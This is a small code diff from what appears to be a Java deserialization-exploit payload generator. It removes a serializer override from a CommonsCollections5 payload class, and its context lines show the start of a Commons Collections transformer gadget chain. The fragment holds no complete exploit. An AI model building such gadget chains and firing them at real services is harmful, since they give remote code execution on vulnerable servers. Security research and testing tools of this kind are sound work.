@@ -37,11 +37,6 @@ public class CommonsCollections5 extends Payload<HashSet> {
     }
 
     @Override
-    public Serializer<?> getSerializer() {
-        return SerializerFactory.createSerializer("");
-    }
-
-    @Override
     public HashSet pack(Object obj) throws Exception {
         Transformer transformerChain = new ChainedTransformer(new Transformer[]{});
 
